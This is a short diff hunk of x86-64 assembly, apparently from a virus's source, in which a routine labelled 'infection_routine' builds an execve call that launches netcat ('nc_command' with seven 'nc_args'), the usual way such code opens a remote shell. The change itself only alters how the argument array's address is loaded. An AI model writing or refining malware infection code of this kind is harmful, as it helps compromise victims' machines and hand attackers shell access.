@@ -527,7 +527,7 @@ infection_routine:
 
 		lea rdi, [rel nc_command]		; execve(nc_command,
 		
-		lea rsi, [rel nc_args]			; [nc_args[0], nc_args[1], nc_args[2], nc_args[3], nc_args[4], nc_args[5], nc_args[6], NULL]			
+		lea rsi, [nc_args]			; [nc_args[0], nc_args[1], nc_args[2], nc_args[3], nc_args[4], nc_args[5], nc_args[6], NULL]
 		lea rdx, [rel nc_arg1]	
 		mov [rsi], rdx
 		lea rdx, [rel nc_arg2]
